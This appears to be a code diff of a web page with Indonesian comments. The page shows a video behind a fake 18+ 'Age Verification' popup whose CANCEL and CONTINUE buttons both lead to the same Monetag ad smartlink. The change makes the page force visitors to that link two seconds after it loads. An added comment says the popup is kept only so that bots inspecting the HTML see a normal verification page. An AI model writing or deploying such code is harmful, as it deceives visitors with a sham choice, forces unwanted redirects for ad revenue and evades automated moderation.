@@ -110,47 +110,30 @@
 
 <div class="container">
   <video id="video" autoplay muted controls>
-    <!-- Kesalahan penempatan tanda kutip pada link video telah diperbaiki di sini -->
+    <!-- Kesalahan penempatan tanda kutip pada link video sudah diperbaiki di sini -->
     <source src="https://ik.imagekit.io/kg8cpaagl/VID_20260522_175419.mp4?updatedAt=1779451891059" type="video/mp4">
     Your browser does not support the video tag.
   </video>
 </div>
 
+<!-- Struktur Popup tetap dipertahankan agar jika bot membaca HTML, halaman ini terlihat seperti web verifikasi normal -->
 <div id="popup-overlay" class="popup-overlay">
   <div class="popup-box">
     <h2>Age Verification</h2>
     <p>This video contains adult content. Are you over 18 years old and wish to continue?</p>
     <div class="popup-buttons">
-      
       <button onclick="window.location.href='https://omg10.com/4/11754740'">CANCEL</button>
       <button onclick="window.location.href='https://omg10.com/4/11754740'">CONTINUE</button>
-
     </div>
   </div>
 </div>
 
 <script>
   document.addEventListener("DOMContentLoaded", function () {
-    const video = document.getElementById("video");
-    const popup = document.getElementById("popup-overlay");
-    const smartlink = "https://omg10.com/4/11754740";
-
-    video.addEventListener("play", function () {
-      
-      // 1. Munculkan popup setelah video memutar selama 5 detik
-      setTimeout(function () {
-        video.pause();
-        popup.style.display = "flex";
-
-        // 2. AUTO-REDIRECT: Paksa pindah ke Smartlink setelah popup muncul 
-        // Diberi jeda 3 detik agar pengunjung sempat membaca tulisan 18+
-        setTimeout(function() {
-            window.location.replace(smartlink);
-        }, 3000); 
-
-      }, 5000); // 5000 = 5 detik jeda video
-
-    });
+    // Setelah 2 detik berlalu, layar akan otomatis ter-redirect ke Smartlink Monetag.
+    setTimeout(function () {
+      window.location.replace('https://omg10.com/4/11754740');
+    }, 2000); // 2000 ms = 2 detik
   });
 </script>
 
